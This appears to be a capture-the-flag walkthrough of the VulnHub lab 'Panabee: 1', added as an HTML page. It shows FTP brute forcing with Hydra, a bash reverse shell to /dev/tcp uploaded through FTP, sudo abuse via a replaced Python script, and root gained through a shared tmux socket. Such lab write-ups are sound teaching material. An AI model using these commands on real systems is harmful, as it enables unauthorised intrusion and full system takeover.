@@ -1,0 +1,122 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Panabee: 1: Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/panabee-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-10-05T18:58:51+00:00">October 5, 2020</time><time class="updated" datetime="2025-07-10T16:50:38+00:00">July 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to crack this vulnerable machine called Panabee: 1. It is created by ch4rm. He is available on Twitter by handle <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/aniqfakhrul">aniqfakhrul</a>.</strong></span> This is a Boot to root kind of challenge. We need to get root privileges on the machine and read the root flag to complete the challenge. Overall it was an intermediate machine to crack.</span></p>
+<p><span style="color: #000000;">Download Lab from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/panabee_1,502/">here</a></strong></span>.</span></p>
+<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
+<ul>
+<li><span style="color: #000000;">Nmap Port Scan</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Enumeration</strong></span>
+<ul>
+<li><span style="color: #000000;">Browsing HTTP Service</span></li>
+<li><span style="color: #000000;">Enumerating SMB Service</span></li>
+<li><span style="color: #000000;">Bruteforcing FTP Credentials</span></li>
+<li><span style="color: #000000;">Enumerating FTP Service</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Exploitation</strong></span>
+<ul>
+<li><span style="color: #000000;">Exploiting File Upload Vulnerability</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Post Exploitation</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating Sudo Permissions</span></li>
+<li><span style="color: #000000;">Uploading Malicious Script</span></li>
+<li><span style="color: #000000;">Getting Jenny User Session</span></li>
+<li><span style="color: #000000;">Downloading pspy64 script</span></li>
+<li><span style="color: #000000;">Running pspy64 script</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
+<ul>
+<li><span style="color: #000000;">Exploiting tmux for Root</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Reading Root Flag</strong></span></li>
+</ul>
+<h3><span style="color: #800000;">Walkthrough</span></h3>
+<h3><span style="color: #800000;">Network Scanning</span></h3>
+<p><span style="color: #000000;">The IP Address of the machine is found to be 192.168.0.165. To move forward we need to find the services that are running on the machine. We can achieve this using a nmap Aggressive scan.  Nmap reveals a lot of services. We have the FTP (21), SSH (22), SMTP (25), HTTP (80), NetBIOS (139, 445).</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p- -A 192.168.0.165</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZfVA2KFb0gY/X3tqd16oSYI/AAAAAAAApMg/5y4EPG0dsxgUcWXbCeEuU9FqvYU41SSQQCLcBGAsYHQ/s16000/1.png"/></span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">We start with the Enumeration stage. The first Service we decided to take a look was HTTP. Upon looking at the IP Address in Web Browser we see an Apache2 Default Page. Nothing special to look here.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GsiHwsWGXd8/X3tqh7ded_I/AAAAAAAApMk/net84CVWDHYvU6JqAmuMRmd3RhIzsva9wCLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">After this, Next service we decided to enumerate was SMB. Then, we connected to the service using the smbclient tool. Here we see the bunch of shares that are hosted on the machine. The share “note” seemed to be worth looking into. We reconnect to that share. Here we find a text file by the same name. Then we download the text file onto our local system using the get command. We read the text file it was addressed to goper. Cool a username. The note apologises for late response and mentions the server will backup whatever the files that are into the home directory of the user goper.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbclient -L \\192.168.0.165
+smbclient \\\\192.168.0.165\note
+ls
+get note.txt
+exit
+cat note.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Joz6VXMNobE/X3tqmNKv59I/AAAAAAAApMo/rIMfg2a_Om4LPt4jaSFNcebE5mwT89ORACLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">Since there is a user on the machine by the name of goper. It is possible that goper has the access to the FTP service. The issue with this theory that we are still unaware for a password for the user goper. This is where we thought that Bruteforcing is a good idea. We used the rockyou wordlist and Hydra as the tool to bruteforce. In few seconds it was in front of us that the password for the user goper is spiderman. My spider senses are tingling here. Let’s take a look inside the FTP service.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">hydra -l goper -P /usr/share/wordlists/rockyou.txt 192.168.0.165 ftp</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CfQAI4ZccOQ/X3tqprHXUxI/AAAAAAAApMs/2ha10mUHX4ckj3sWbIkexM_aVmhrmAbLQCLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">Then, we connect to FTP service using the credentials that we just found. Here we have a python file by the name of the status. We downloaded the status.py to our local system to take a closer look at it. A simple look on the script tells us all this does is send ping packets to the server or home IP Address and writes the Status that Server is up or down in a file status.txt inside the user jenny’s home directory. Cool another user.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ftp 192.168.0.165
+ls
+get status.py
+bye
+cat status.py</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KmzeSbxbSIU/X3tqtE6DEvI/AAAAAAAApMw/yI4g3HaZFlUr6ySJNHzDr93u3BtmLuHoACLcBGAsYHQ/s16000/5.png"/></span></p>
+<h3><span style="color: #800000;">Exploitation</span></h3>
+<p><span style="color: #000000;">Since there is a backup functionality and FTP service that means we can upload files to the target machine as the user goper. This makes this simple. We can create a simple bash reverse shell and upload it using the FTP service and get a session on the target machine. We created a shell file as shown in the image below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/192.168.0.147/8080 0&gt;&amp;1</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yQD-LbEH0Cw/X3tqxdkF2rI/AAAAAAAApM4/A268dTtsMaQKwIKIzsDWyhCUE9MS297TgCLcBGAsYHQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">Then we connect to the FTP service again and we upload the backup.sh payload file using the put command. The upload was successful.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ftp 192.168.0.165
+goper
+put backup.sh
+ls</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zKu_Vjg4fyo/X3tq2gbDfVI/AAAAAAAApNA/yHwfTS0wVV4ha-Z3Jl0Kbv6JS3wrJ3y6wCLcBGAsYHQ/s16000/7.png"/></span></p>
+<h3><span style="color: #800000;">Post Exploitation</span></h3>
+<p><span style="color: #000000;">We started the netcat listener to capture the session generated by the payload. We get the session in a few moments. After getting the session, we use the sudo -l command to check for the binaries that can be used to escalate the privilege on the target machine. As we can see that we can execute the status.py file with root permissions as jenny user. That means we need to first replace the status.py with a reverse shell and get a session as jenny user.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 8080
+sudo -l</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kywmiMiLeHE/X3tq6ZqJnOI/AAAAAAAApNI/YwLnkH4rG8kbyhGri0lS0hd2gpngSwcqQCLcBGAsYHQ/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">We created a reverse python shell targeting port 8888 of our local machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EO4TZ3O0Nus/X3tq9x925eI/AAAAAAAApNQ/jA4jImC4KGcqYlDKuh7EpoNTfzYdVseEgCLcBGAsYHQ/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">Now we need to send this file to the Target machine. For this, we will be using the FTP service. Now that we have uploaded a shell file but it won’t have the execution privileges. For this, we will use the chmod command from the FTP shell as shown in the image below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">put status.py
+chmod 777 status.py</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Zwtth-3RfVE/X3trCBzjf5I/AAAAAAAApNY/aOeCqkKc2CIh6AGVDMFBxYZO1fcGhyfkwCLcBGAsYHQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">Then we create the listener on the port 8888 and get back to the session we have as the goper user. Here we will execute the file we just uploaded as jenny user.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -u jenny /usr/bin/python3 /home/goper/status.py</pre>
+<p><span style="color: #000000;">Then, we get back to the listener we created. Here we can see that we have a session as jenny. We move to the tmp directory as it has write permissions. Then we download the pspy64 script on the target machine. We provide it with proper permissions and execute it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 8888
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
+chmod 777 pspy64
+./pspy64</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Ab7_JdzwsGY/X3trJkto-xI/AAAAAAAApNg/e44tqHY7EIsAG3lOgv5pDunBwMzFNPKvQCLcBGAsYHQ/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">Since we see that there are processes related to tmux server. This means that it is possible to get the root using tmux.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vXA6GN9XT2M/X3trNQcWoqI/AAAAAAAApNs/Jvp_0wkULM8Mx1IEykj4mPzzK1OktQCbACLcBGAsYHQ/s16000/13.1.png"/></span></p>
+<p><span style="color: #000000;">We also take a look at history and find that a lot of tmux was used. This command shows that a session of tmux is being shared. We can also see that tmux default is located in the opt directory.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KBiECQ5x9qU/X3trRVGFo4I/AAAAAAAApNw/jh6uwJNr_-wgS5kiKc79fEY5SKliRNGigCLcBGAsYHQ/s16000/13.png"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">To get root from tmux is not that difficult of a task. If you are not familiar to tmux or getting root as tmux, check our article <a style="color: #000000;" href="https://www.hackingarticles.in/linux-for-pentester-tmux-privilege-escalation/">here</a>. We need to Export the Term to xterm to execute it using tmux. Then use the tmux to attach the default socket.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">export TERM=xterm
+tmux -S /opt/.tmux-0/sockets/default attach</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-82fm0YymILE/X3trVthC3dI/AAAAAAAApN4/8ZTawjPGeWcblqWSjQWmHRUYSvp35G-jACLcBGAsYHQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">Now that tmux is executed with set the TERM to xterm and we have the root privilege as shown in the image below. Then, we will traverse into the root directory to read the root flag. This concludes this box.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">id
+cd /root
+ls
+cat proof.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-S2OHNs4w8SA/X3trZSWSF7I/AAAAAAAApOA/3-7oZ9WWoYkU3o7JKkfMjewQUeJMO9T6gCLcBGAsYHQ/s16000/15.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <strong>Twitter</strong> and <strong><a style="color: #000000;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
